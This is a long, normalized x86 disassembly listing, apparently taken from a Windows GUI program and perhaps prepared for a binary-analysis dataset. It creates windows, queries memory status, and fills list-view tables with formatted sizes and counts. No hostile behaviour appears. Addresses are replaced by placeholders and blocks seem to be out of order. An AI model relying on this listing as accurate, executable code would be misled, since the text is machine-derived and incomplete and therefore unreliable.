sar eax 0x2
cmp eax ebp
jbe r-xdata
mov esi 0x1a4
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
add esi 0xb4
mov edi [ esp + 0x2c ]
mov [ esp + 0x1c ] 0x0
lea esp [ esp ]
mov eax [ ecx + edx * 4 ]
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
cmp edx eax
jge r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
inc [ esp + 0x10 ]
jmp r-xdata
mov edx [ eax + 0x18 ]
test edx edx
jne r-xdata
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x10 ] edi
nop
mov eax [ ecx + edx * 4 ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ eax + 0x20 ]
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
mov edx [ esp + 0x1c ]
cmp edx eax
jge r-xdata
test ecx ecx
jne r-xdata
mov eax [ esp + 0x2c ]
test eax eax
jne r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x30 ]
sub eax edi
sar eax 0x7
xor eax eax
jmp r-xdata
mov edx [ esp + 0x14 ]
mov eax [ edx + 0x24 ]
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
mov edx [ esp + 0x30 ]
mov [ esp + 0x10 ] 0x0
mov ecx edi
mov edi [ esp + 0x30 ]
sub edi eax
sar edi 0x7
xor edi edi
jmp r-xdata
test edi edi
mov [ esp + 0x418 ] 0x1
je r-xdata
mov edi [ esp + 0x10 ]
mov eax [ edi + 0x20 ]
add edi 0xc
cmp eax 0x10
jb r-xdata
cmp [ esp + 0x14 ] eax
jge r-xdata
inc [ esp + 0x1c ]
jmp r-xdata
mov edx [ esp + 0x30 ]
mov [ esp + 0x10 ] 0x0
mov ecx edi
lea esp [ esp ]
mov eax edx
sub eax edi
sar eax 0x7
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ rw-data ]
shl eax 0x7
lea edi [ eax + ecx ]
mov eax [ esp + 0x10 ]
mov ecx [ edx + eax * 4 ]
mov [ edi + 0x78 ] ecx
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
test eax eax
mov [ esp + 0x20 ] eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ rw-data ]
mov edx [ edx + ecx * 4 ]
mov ecx [ esp + 0x2c ]
add ecx 0x78
xor ecx ecx
sub esp 0x80
mov eax esp
mov [ eax ] ecx
mov [ eax + 0x1c ] ecx
mov edx 0xf
mov [ eax + 0x20 ] edx
mov [ eax + 0xc ] cl
mov [ eax + 0x70 ] ecx
mov [ eax + 0x74 ] edx
mov [ eax + 0x60 ] cl
lea eax [ edi + 0x1 ]
mov [ esp + 0xa0 ] esp
push eax
lea ecx [ esp + 0xac ]
mov [ esp + 0x98 ] edi
call sub_4750d0
xor eax eax
test edi edi
mov [ esp + 0x1c ] eax
jle r-xdata
push 0x0
push 0x0
push 0x1004
push ebp
call esi
push eax
lea eax [ esp + 0x314 ]
push r--data
push eax
call sub_4b675e
mov edi [ esp + 0x7c ]
add esp 0xc
push 0x0
push edi
push 0x0
push ebx
push 0xc
push 0x1ae
push 0x12
push 0x6
push 0x5000000b
lea ecx [ esp + 0x334 ]
push ecx
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov edx [ rw-data ]
push 0x1
push edx
push 0x30
push eax
call esi
mov eax [ esp + 0x40 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x44 ]
mov ecx eax
and eax 0x7fffffff
mov [ esp + 0x24 ] eax
fild [ esp + 0x20 ]
and ecx 0x80000000
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] 0x0
fild [ esp + 0x20 ]
sub esp 0x8
lea ecx [ esp + 0x318 ]
fchs
faddp st1
fmul [ r--data ]
fstp [ esp ]
push r--data
push ecx
call sub_4b675e
add esp 0x10
push 0x0
push edi
push 0x0
push ebx
push 0xc
push 0x1ae
push 0x12
push 0xc8
push 0x5000000b
lea edx [ esp + 0x334 ]
push edx
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov ecx [ rw-data ]
push 0x1
push ecx
push 0x30
push eax
call esi
push ebp
call [ SetFocus@IAT ]
mov ebp [ esp + 0xa8 ]
test ebp ebp
mov [ esp + 0x1c ] 0xbe
je r-xdata
cmp edi [ esp + 0x30 ]
mov [ esp + 0x14 ] edi
je r-xdata
push edi
call sub_457f90
add esp 0x4
push 0x0
push 0x0
push 0x1004
add edi eax
push ebp
mov [ esp + 0x8c ] 0x1
mov [ esp + 0xa0 ] edi
call esi
lea edx [ esp + 0x7c ]
push edx
push 0x0
push 0x1007
push ebp
mov [ esp + 0x90 ] eax
mov [ esp + 0x94 ] 0x0
call esi
mov eax [ esp + 0x10 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
cmp eax 0x10000001
jne r-xdata
mov edi [ edi ]
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax edx
sub eax edi
sar eax 0x7
xor eax eax
jmp r-xdata
xor ecx ecx
cmp edi ecx
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax [ ecx ]
je r-xdata
cmp [ esp + 0x10 ] eax
jge r-xdata
mov ecx [ edi ]
test ecx ecx
mov [ esp + 0x14 ] ecx
je r-xdata
inc [ eax + 0xd48 ]
cmp edi eax
mov [ esp + 0x1c ] eax
jle r-xdata
inc eax
add ecx 0x80
cmp eax edi
jl r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ esp + 0xac ]
sub eax ebp
sar eax 0x2
test eax eax
mov [ esp + 0x20 ] eax
jbe r-xdata
push edi
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
and eax 0xff
mov [ esp + 0x18 ] eax
movzx ecx [ ebx + 0x32 ]
mov [ esp + 0x18 ] ecx
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax [ ecx ]
je r-xdata
cmp [ esp + 0x10 ] eax
jge r-xdata
mov eax edx
sub eax edi
sar eax 0x7
xor eax eax
jmp r-xdata
inc [ esp + 0x10 ]
add ecx 0x80
jmp r-xdata
mov [ edi ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
dec [ ecx + 0xd48 ]
jne r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x2c ]
mov ecx eax
shl ecx 0x7
lea edi [ ecx + edx - 0x8 ]
sub eax [ esp + 0x1c ]
mov [ esp + 0x18 ] eax
cmp edx [ ecx ]
jl r-xdata
mov [ esp + 0x1c ] eax
jmp r-xdata
lea edx [ esp + 0x48 ]
push edx
call [ GlobalMemoryStatus@IAT ]
fild [ esp + 0x50 ]
mov eax [ esp + 0x50 ]
test eax eax
jge r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
test eax eax
jbe r-xdata
push 0x0
push 0xfffffffa
push ebx
call [ GetWindowLongA@IAT ]
push eax
push 0x65
push ebx
push 0xa0
push 0x26e
push 0xd2
push 0x6
push 0x50000009
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
push 0x0
push 0x0
mov edi eax
push 0x1037
push edi
call esi
or eax 0x21
push eax
push 0x0
push 0x1036
push edi
call esi
lea edx [ esp + 0x48 ]
push edx
push 0x0
push 0x101b
mov ebp 0x1
push edi
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x5c ] ebp
mov [ esp + 0x60 ] 0x5a
mov [ esp + 0x64 ] r--data
mov [ esp + 0x6c ] 0x0
call esi
lea eax [ esp + 0x48 ]
push eax
push ebp
push 0x101b
push edi
mov [ esp + 0x5c ] ebp
mov [ esp + 0x60 ] 0x5a
mov [ esp + 0x64 ] r--data
mov [ esp + 0x6c ] ebp
call esi
xor ebp ebp
mov ecx [ esp + 0x14 ]
call sub_460f30
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x30 ]
add eax 0x80
cmp eax ecx
mov [ esp + 0x14 ] eax
jne r-xdata
and eax 0xff
movzx eax [ edi + 0x32 ]
jmp r-xdata
call sub_40af00
push eax
push 0x0
mov ecx ebx
call sub_444100
mov edi eax
call sub_40af00
push eax
push 0x0
mov ecx ebx
call sub_4440b0
imul edi eax
imul edi [ esp + 0x18 ]
mov ecx [ esp + 0x40 ]
mov ebx [ esp + 0x44 ]
xor eax eax
shr edi 0x3
add ecx edi
adc ebx eax
add edi 0x200
adc eax eax
shrd edi eax 0xa
mov [ esp + 0x44 ] ebx
mov ebx 0x1
push ebx
lea edx [ esp + 0x200 ]
push edx
shr eax 0xa
push eax
push edi
mov [ esp + 0x50 ] ecx
call sub_4359e0
add esp 0x10
push r--data
lea eax [ esp + 0x200 ]
push eax
call [ lstrcatA@IAT ]
lea edx [ esp + 0x7c ]
push edx
push 0x0
push 0x1006
lea ecx [ esp + 0x208 ]
push ebp
mov [ esp + 0x8c ] ebx
mov [ esp + 0xa0 ] ecx
mov [ esp + 0x94 ] ebx
call esi
mov eax [ esp + 0x10 ]
mov edi [ eax ]
mov eax [ edi + 0xc ]
cmp eax 0x10000001
jne r-xdata
mov eax edx
sub eax edi
sar eax 0x7
xor eax eax
jmp r-xdata
inc [ esp + 0x10 ]
add ecx 0x80
jmp r-xdata
mov eax 0xf
mov [ esp + 0x144 ] ecx
mov [ esp + 0x164 ] eax
mov [ esp + 0x160 ] ecx
mov [ esp + 0x150 ] 0x0
mov [ esp + 0x1b8 ] eax
mov [ esp + 0x1b4 ] ecx
mov [ esp + 0x1a4 ] 0x0
mov eax [ esp + 0x18 ]
inc [ eax + 0xd48 ]
mov eax [ esp + 0x144 ]
cmp eax ecx
mov [ esp + 0x418 ] 0x4
je r-xdata
cmp [ esp + 0x10 ] eax
jne r-xdata
test edi edi
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x20 ] edx
jne r-xdata
call sub_43fe30
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
mov eax [ esp + 0x24 ]
add esp 0x4
mov eax [ edi + 0x8 ]
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
inc [ eax + 0xd48 ]
fmul [ r--data ]
mov ecx [ esp + 0x54 ]
sub esp 0x10
test ecx ecx
fstp [ esp + 0x8 ]
fild [ esp + 0x64 ]
jge r-xdata
fadd [ r--data ]
mov edi [ esp + 0x1c ]
xor ebp ebp
push ebp
push 0xfffffffa
add edi 0x8
push ebx
mov [ esp + 0x28 ] edi
call [ GetWindowLongA@IAT ]
push eax
push 0x66
push ebx
push 0xa0
push 0x26e
add edi 0xc
push edi
push 0x6
push 0x50000001
push r--data
push r--data
push ebp
call [ CreateWindowExA@IAT ]
push ebp
push ebp
mov edi eax
push 0x1037
push edi
call esi
or eax 0x21
push eax
push ebp
push 0x1036
push edi
call esi
lea edx [ esp + 0x48 ]
push edx
push ebp
push 0x101b
push edi
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x5c ] ebp
mov [ esp + 0x60 ] 0xfa
mov [ esp + 0x64 ] r--data
mov [ esp + 0x6c ] ebp
call esi
mov eax 0x1
lea ecx [ esp + 0x48 ]
push ecx
push eax
push 0x101b
push edi
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] 0x5a
mov [ esp + 0x64 ] r--data
mov [ esp + 0x6c ] eax
call esi
mov edx [ rw-data ]
xor ecx ecx
mov [ esp + 0x18 ] ebp
push 0x0
push 0x0
push 0x1004
push edi
call esi
push eax
lea eax [ esp + 0x314 ]
push r--data
push eax
call sub_4b675e
mov edi [ esp + 0x7c ]
add esp 0xc
push 0x0
mov ebp [ CreateWindowExA@IAT ]
push edi
push 0x0
push ebx
push 0xc
push 0x1ae
push 0xc6
push 0x6
push 0x5000000b
lea ecx [ esp + 0x334 ]
push ecx
push r--data
push 0x0
call ebp
mov edx [ rw-data ]
push 0x1
push edx
push 0x30
push eax
call esi
mov eax [ esp + 0x74 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x78 ]
mov ecx eax
and eax 0x7fffffff
mov [ esp + 0x24 ] eax
fild [ esp + 0x20 ]
and ecx 0x80000000
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] 0x0
fild [ esp + 0x20 ]
sub esp 0x8
lea ecx [ esp + 0x318 ]
fchs
faddp st1
fmul [ r--data ]
fstp [ esp ]
push r--data
push ecx
call sub_4b675e
add esp 0x10
push 0x0
push edi
push 0x0
push ebx
push 0xc
push 0x1ae
push 0xc6
push 0xc8
push 0x5000000b
lea edx [ esp + 0x334 ]
push edx
push r--data
push 0x0
call ebp
mov ecx [ rw-data ]
push 0x1
push ecx
push 0x30
push eax
call esi
mov ebp [ esp + 0xa8 ]
mov [ esp + 0x1c ] 0x172
mov ecx [ esp + 0xa8 ]
mov edx [ ecx + ebp * 4 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x4 ]
mov ecx [ esp + 0x74 ]
cdq
add ecx eax
mov [ esp + 0x74 ] ecx
mov ecx [ esp + 0x78 ]
adc ecx edx
add eax 0x200
adc edx 0x0
shrd eax edx 0xa
mov [ esp + 0x78 ] ecx
push 0x1
lea ecx [ esp + 0x200 ]
push ecx
shr edx 0xa
push edx
push eax
call sub_4359e0
add esp 0x10
push r--data
lea edx [ esp + 0x200 ]
push edx
call [ lstrcatA@IAT ]
push 0x0
push 0x0
push 0x1004
lea eax [ esp + 0x208 ]
push edi
mov [ esp + 0x8c ] 0x1
mov [ esp + 0xa0 ] eax
mov [ esp + 0x94 ] 0x0
call esi
lea ecx [ esp + 0x7c ]
push ecx
push 0x0
push 0x1007
push edi
mov [ esp + 0x90 ] eax
call esi
mov edx [ esp + 0xa8 ]
mov eax [ edx + ebp * 4 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax ]
push ecx
mov ecx [ edx + 0x14 ]
mov edx [ eax + 0xc ]
push ecx
push edx
lea eax [ esp + 0x208 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x14
lea edx [ esp + 0x7c ]
push edx
push 0x0
mov eax 0x1
push 0x1006
lea ecx [ esp + 0x208 ]
push edi
mov [ esp + 0x8c ] eax
mov [ esp + 0xa0 ] ecx
mov [ esp + 0x94 ] eax
call esi
inc ebp
jmp r-xdata
mov edi [ esp + 0x10 ]
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x20 ] edx
jne r-xdata
push eax
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_444100
push eax
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_4440b0
mov ebx [ wsprintfA@IAT ]
push eax
lea ecx [ esp + 0x208 ]
push r--data
push ecx
call ebx
add esp 0x14
lea eax [ esp + 0x7c ]
push eax
push 0x0
push 0x1006
lea edx [ esp + 0x208 ]
push ebp
mov [ esp + 0x8c ] 0x1
mov [ esp + 0xa0 ] edx
mov [ esp + 0x94 ] 0x2
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
xor ecx ecx
mov eax 0xf
mov [ esp + 0xc4 ] ecx
mov [ esp + 0xe4 ] eax
mov [ esp + 0xe0 ] ecx
mov [ esp + 0xd0 ] cl
mov [ esp + 0x138 ] eax
mov [ esp + 0x134 ] ecx
mov [ esp + 0x124 ] cl
mov eax [ esp + 0x18 ]
inc [ eax + 0xd48 ]
mov eax [ esp + 0xc4 ]
cmp eax ecx
mov [ esp + 0x418 ] 0x5
je r-xdata
cmp [ esp + 0x10 ] eax
jne r-xdata
test edi edi
jne r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
add eax 0x28
push eax
lea ecx [ esp + 0x150 ]
mov [ esp + 0x148 ] edx
call sub_402540
test edi edi
mov [ esp + 0x1bc ] 0xffffffff
je r-xdata
mov edx [ eax + 0xd48 ]
mov [ esp + 0x10 ] eax
add eax 0xd48
dec edx
cmp edx ecx
mov [ eax ] edx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ edi + 0x8 ]
call sub_401e80
mov eax [ esp + 0x10 ]
mov ecx [ rw-data ]
inc eax
mov [ esp + 0x10 ] eax
jmp r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x10 ]
mov ecx [ edx + eax * 4 ]
mov edx [ rw-data ]
imul ecx ecx 0x70
add ecx edx
push ecx
lea ecx [ edi + 0x8 ]
call sub_402540
mov ecx [ rw-data ]
mov ecx [ esp + 0x20 ]
lea edx [ edi - 0x70 ]
mov [ edi + 0x8 ] ecx
push edx
lea ecx [ edi + 0x10 ]
call sub_402540
mov eax [ edi ]
mov [ edi + 0x80 ] eax
mov eax [ esp + 0x18 ]
sub edi 0x80
dec eax
mov [ esp + 0x18 ] eax
jne r-xdata
dec [ eax + 0xd48 ]
jne r-xdata
fmul [ r--data ]
mov eax [ esp + 0x48 ]
mov edx [ rw-data ]
mov ecx [ esp + 0x84 ]
mov edi [ esp + 0x4c ]
fstp [ esp ]
add ecx eax
mov eax [ esp + 0x88 ]
adc eax edi
mov edi [ esp + 0x54 ]
push edx
add ecx [ esp + 0x54 ]
adc eax edi
mov [ esp + 0x4c ] ecx
mov ecx eax
and eax 0x7fffffff
mov [ esp + 0x50 ] eax
fild [ esp + 0x4c ]
and ecx 0x80000000
mov [ esp + 0x50 ] ecx
mov [ esp + 0x4c ] 0x0
fild [ esp + 0x4c ]
sub esp 0x8
lea eax [ esp + 0x218 ]
fchs
faddp st1
fmul [ r--data ]
fstp [ esp ]
push r--data
push eax
call sub_4b675e
mov ecx [ esp + 0x94 ]
add esp 0x24
push 0x0
push ecx
push 0x0
push ebx
push 0xc
push 0x1ae
push 0x0
push 0x6
push 0x5000000b
lea edx [ esp + 0x220 ]
push edx
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov ecx [ rw-data ]
push 0x1
push ecx
push 0x30
push eax
call esi
test ebp ebp
je r-xdata
fadd [ r--data ]
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp ebp [ esp + 0x20 ]
jge r-xdata
push eax
lea edx [ esp + 0x200 ]
push r--data
push edx
call ebx
add esp 0xc
lea ecx [ esp + 0x7c ]
push ecx
push 0x0
push 0x1006
lea eax [ esp + 0x208 ]
push ebp
mov [ esp + 0x8c ] 0x1
mov [ esp + 0xa0 ] eax
mov [ esp + 0x94 ] 0x3
call esi
mov eax [ edi ]
mov ecx [ eax + 0xd20 ]
test ecx ecx
jne r-xdata
mov edi [ esp + 0x10 ]
mov eax [ edi + 0x3c ]
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
add eax 0x98
push eax
lea ecx [ esp + 0xd0 ]
mov [ esp + 0xc8 ] edx
call sub_402540
test edi edi
mov [ esp + 0x13c ] 0xffffffff
je r-xdata
mov edx [ eax + 0xd48 ]
mov [ esp + 0x10 ] eax
add eax 0xd48
dec edx
cmp edx ecx
mov [ eax ] edx
jne r-xdata
lea edx [ esp + 0x144 ]
push edx
push 0x1
push ecx
mov ecx [ esp + 0x3c ]
mov eax esp
mov [ eax ] ecx
lea ecx [ esp + 0x34 ]
call sub_46cc30
mov edi [ esp + 0x2c ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x34 ]
sub eax edi
sub ecx edi
sar eax 0x7
sar ecx 0x7
cmp eax ecx
jae r-xdata
mov ecx [ esp + 0x10 ]
call sub_43fe30
mov ecx [ esp + 0x10 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ edi - 0x78 ]
test eax eax
mov [ esp + 0x20 ] eax
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx eax
call sub_43fe30
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx rw-data
call sub_401420
push ebp
call j_sub_4b66ed#2
add esp 0x4
push 0x0
push 0x0
push 0x1004
push edi
call esi
push eax
lea eax [ esp + 0x314 ]
push r--data
push eax
call sub_4b675e
mov edi [ esp + 0x7c ]
mov ebp [ esp + 0x28 ]
add esp 0xc
push 0x0
push edi
push 0x0
push ebx
push 0xc
push 0x1ae
push ebp
push 0x6
push 0x5000000b
lea ecx [ esp + 0x334 ]
push ecx
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov edx [ rw-data ]
push 0x1
push edx
push 0x30
push eax
call esi
mov eax [ esp + 0x38 ]
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x3c ]
mov ecx eax
and eax 0x7fffffff
mov [ esp + 0x6c ] eax
fild [ esp + 0x68 ]
and ecx 0x80000000
mov [ esp + 0x6c ] ecx
mov [ esp + 0x68 ] 0x0
fild [ esp + 0x68 ]
sub esp 0x8
lea ecx [ esp + 0x318 ]
fchs
faddp st1
fmul [ r--data ]
fstp [ esp ]
push r--data
push ecx
call sub_4b675e
add esp 0x10
push 0x0
push edi
push 0x0
push ebx
push 0xc
push 0x1ae
push ebp
push 0xc8
push 0x5000000b
lea edx [ esp + 0x334 ]
push edx
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov ecx [ rw-data ]
push 0x1
push ecx
push 0x30
push eax
call esi
mov ebp [ esp + 0xa8 ]
cmp [ edx + ecx * 4 ] 0x0
je r-xdata
cmp ecx eax
jge r-xdata
mov ecx [ edi ]
mov eax [ ecx + 0xcd0 ]
and eax 0xff
imul eax [ ecx + 0xd2c ]
imul eax [ ecx + 0xd28 ]
mov ecx [ esp + 0x40 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
cdq
add ecx eax
mov [ esp + 0x40 ] ecx
mov ecx [ esp + 0x44 ]
adc ecx edx
add eax 0x200
adc edx 0x0
shrd eax edx 0xa
mov [ esp + 0x44 ] ecx
push 0x1
lea ecx [ esp + 0x1c8 ]
push ecx
shr edx 0xa
push edx
push eax
call sub_4359e0
mov eax [ edi ]
mov ecx [ eax + 0xcd0 ]
lea edx [ esp + 0x1d4 ]
push edx
mov edx [ eax + 0xd2c ]
mov eax [ eax + 0xd28 ]
and ecx 0xff
push ecx
push edx
push eax
lea ecx [ esp + 0x21c ]
push r--data
push ecx
call ebx
add esp 0x28
lea eax [ esp + 0x7c ]
push eax
push 0x0
push 0x1006
lea edx [ esp + 0x208 ]
push ebp
mov [ esp + 0x8c ] 0x1
mov [ esp + 0xa0 ] edx
mov [ esp + 0x94 ] 0x4
call esi
mov ecx [ eax + 0xd24 ]
test ecx ecx
jne r-xdata
lea edx [ esp + 0xc4 ]
push edx
push 0x1
push ecx
mov ecx [ esp + 0x3c ]
mov eax esp
mov [ eax ] ecx
lea ecx [ esp + 0x34 ]
call sub_46cc30
mov edi [ esp + 0x2c ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x34 ]
sub eax edi
sub ecx edi
sar eax 0x7
sar ecx 0x7
cmp eax ecx
jae r-xdata
mov ecx [ esp + 0x10 ]
call sub_43fe30
mov ecx [ esp + 0x10 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x164 ] 0x10
mov [ esp + 0x1b8 ] 0xf
mov [ esp + 0x1b4 ] 0x0
mov [ esp + 0x1a4 ] 0x0
jb r-xdata
mov edx [ esp + 0x1a4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x68 ]
push ecx
mov ecx [ esp + 0x34 ]
lea edx [ esp + 0x2c ]
push edx
lea eax [ esp + 0x14c ]
push eax
push 0x1
push ecx
call sub_46a2c0
mov eax [ esp + 0x44 ]
add esp 0x14
add eax 0x80
mov [ esp + 0x30 ] eax
jmp r-xdata
mov eax [ esp + 0x18 ]
inc ecx
add eax 0x70
mov [ esp + 0x18 ] eax
jmp r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x18 ]
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
mov [ esp + 0x14 ] eax
jb r-xdata
mov edx [ esp + 0x80 ]
lea ecx [ esp + 0x1d4 ]
push ecx
push edx
mov eax 0x2
push 0x102b
push ebp
mov [ esp + 0x1f4 ] eax
mov [ esp + 0x1f0 ] eax
call esi
cmp [ rw-data ] 0x2
jne r-xdata
mov ecx [ eax + 0xcb8 ]
test ecx ecx
je r-xdata
cmp [ esp + 0xe4 ] 0x10
mov [ esp + 0x138 ] 0xf
mov [ esp + 0x134 ] 0x0
mov [ esp + 0x124 ] 0x0
jb r-xdata
mov edx [ esp + 0x124 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x68 ]
push ecx
mov ecx [ esp + 0x34 ]
lea edx [ esp + 0x2c ]
push edx
lea eax [ esp + 0xcc ]
push eax
push 0x1
push ecx
call sub_46a2c0
mov eax [ esp + 0x44 ]
add esp 0x14
add eax 0x80
mov [ esp + 0x30 ] eax
jmp r-xdata
mov eax [ esp + 0x144 ]
test eax eax
mov [ esp + 0x164 ] 0xf
mov [ esp + 0x160 ] 0x0
mov [ esp + 0x150 ] 0x0
je r-xdata
mov eax [ esp + 0x150 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x1b8 ] 0x10
mov [ esp + 0x418 ] 0x3
jb r-xdata
test edx edx
mov [ esp + 0x10 ] ecx
jne r-xdata
mov ebp [ esp + 0x14 ]
add ebp 0x4
mov ecx eax
mov ebp [ ecx + 0x4 ]
jmp r-xdata
test edi edi
jne r-xdata
mov ecx [ esp + 0x14 ]
mov ebx [ esp + 0x420 ]
inc ecx
add edi 0x80
mov [ esp + 0x10 ] edi
mov edi [ esp + 0x2c ]
mov [ esp + 0x14 ] ecx
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esp + 0xc4 ]
test eax eax
mov [ esp + 0xe4 ] 0xf
mov [ esp + 0xe0 ] 0x0
mov [ esp + 0xd0 ] 0x0
je r-xdata
mov eax [ esp + 0xd0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x138 ] 0x10
mov [ esp + 0x418 ] 0x3
jb r-xdata
mov edx [ eax + 0xd48 ]
mov [ esp + 0x18 ] eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
push ebp
call sub_457f90
add esp 0x4
push 0x0
push 0x0
push 0x1004
add ebp eax
push edi
mov [ esp + 0x8c ] 0x1
mov [ esp + 0xa0 ] ebp
call esi
lea edx [ esp + 0x7c ]
push edx
push 0x0
push 0x1007
push edi
mov [ esp + 0x90 ] eax
mov [ esp + 0x94 ] 0x0
call esi
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x20 ]
mov ecx [ ecx + 0x24 ]
mov edx [ esp + 0x38 ]
mov ebp [ esp + 0x3c ]
add edx eax
adc ebp ecx
add eax 0x200
adc ecx 0x0
shrd eax ecx 0xa
mov [ esp + 0x3c ] ebp
mov [ esp + 0x38 ] edx
mov ebp 0x1
push ebp
lea edx [ esp + 0x200 ]
push edx
shr ecx 0xa
push ecx
push eax
call sub_4359e0
add esp 0x10
push r--data
lea eax [ esp + 0x200 ]
push eax
call [ lstrcatA@IAT ]
lea edx [ esp + 0x7c ]
push edx
push 0x0
push 0x1006
lea ecx [ esp + 0x208 ]
push edi
mov [ esp + 0x8c ] ebp
mov [ esp + 0xa0 ] ecx
mov [ esp + 0x94 ] ebp
call esi
mov edx [ rw-data ]
mov ecx [ esp + 0x10 ]
mov edx [ eax + 0xd48 ]
mov [ esp + 0x14 ] eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov ecx [ esp + 0x18 ]
call sub_43fe30
mov ecx [ esp + 0x18 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x14 ]
call sub_43fe30
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_481410
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4c1107
push eax
mov eax 0x10088
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
push ebp
push esi
push edi
push 0xffffffff
xor edi edi
push edi
push rw-data
lea ecx [ esp + 0x28 ]
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x3c ] edi
mov [ esp + 0x2c ] 0x0
call sub_401dd0
mov eax [ esp + 0x34 ]
mov ebx 0x10
cmp eax ebx
mov eax [ esp + 0x20 ]
mov [ esp + 0x100a0 ] edi
jae r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x20 ]
cmp [ rw-data ] edi
jne r-xdata
push 0x5c
push 0x1
lea ecx [ esp + 0x24 ]
call sub_4017f0
mov ecx [ rw-data ]
cmp ecx ebx
mov eax [ rw-data ]
mov esi eax
jae r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
mov eax [ rw-data ]
mov esi eax
jae r-xdata
push eax
call sub_457f40
add esp 0x4
add eax esi
mov ecx eax
lea esi [ ecx + 0x1 ]
mov esi rw-data
mov eax esi
push eax
call sub_457f40
add esp 0x4
add eax esi
mov ecx eax
lea esi [ ecx + 0x1 ]
lea ecx [ ecx ]
mov esi rw-data
mov eax esi
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
lea ecx [ esp + 0x20 ]
push eax
call sub_401cc0
cmp [ esp + 0x34 ] ebx
mov eax [ esp + 0x20 ]
jae r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
